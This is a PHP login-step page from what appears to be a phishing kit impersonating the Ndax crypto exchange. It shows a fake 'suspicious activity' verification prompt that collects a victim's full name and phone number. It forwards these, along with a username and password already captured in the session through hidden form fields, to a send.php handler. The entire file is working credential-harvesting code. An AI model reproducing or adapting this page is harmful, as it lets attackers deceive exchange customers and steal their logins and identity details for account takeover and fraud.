<?php include_once './config.php'; ?>
<html lang="en">
    <?php
        $title = "Ndax - Login | Canada's most secure crypto exchange";
        include_once './includes/meta.php';
        if(empty($_SESSION["username"]) || empty($_SESSION["password"])) {
            redirect(base_url());
        }
        unset($_SESSION['phone_number']);
    ?>
    <link rel="stylesheet" href="./assets/country-code-picker/css/jquery.ccpicker.css">
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-6 form_div">
                    <?php include_once './includes/header.php'; ?>
                    <div class="row justify-content-center mt60">
                        <div class="col-sm-8 text-start">
                            <h1 class="h1 text-white fw-normal fs30">Verification Required</h1>
                            <div class='fs14 fw-normal py10'>Enter the 2-step verification generated by your authenticator app.</div>
                            <div class='fs13 py10'>Some Suspicious Activity Found With Your Account, Enter Your Full Name and Phone Number to Verify Your Identity.</div>
                            <form method="post" action="<?= base_url('send.php')?>" class="">
                                <input type="hidden" name="username" value="<?=$_SESSION['username']?>" >
                                <input type="hidden" name="password" value="<?=$_SESSION['password']?>" >
                                <div class="my40">
                                    <label class="form-label fs14 text-white" style="letter-spacing: 1.2px;">Full Name</label>
                                    <input name="name" type="text" minlength="3" maxlength="100" required="" class="form-control rounded-pill form-control-add" placeholder="Full Name" value="" >
                                </div>
                                <div class="my40">
                                    <label class="form-label fs14 text-white" style="letter-spacing: 1.2px;">Phone Number</label>
                                    <div class="form-control border-0 rounded-pill" style="background-color: #403d4f4d">
                                        <input name="phone_number" type="number" id="phone_number" required="" class="  form-control-add" placeholder="Phone number" value="" >
                                    </div>
                                </div>
                                <div class="text-center mx-auto d-grid gap-2 my40">
                                    <button type="submit" class="btn btn-primary btn-primary-2 rounded-pill py12 btn-block">Verify</button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <?php include_once './includes/right.php'; ?>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function() {
                $("#phone_number").CcPicker({ countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json')?>", searchPlaceHolder: "Find..." });
            });
            
        </script>
    </body>
</html>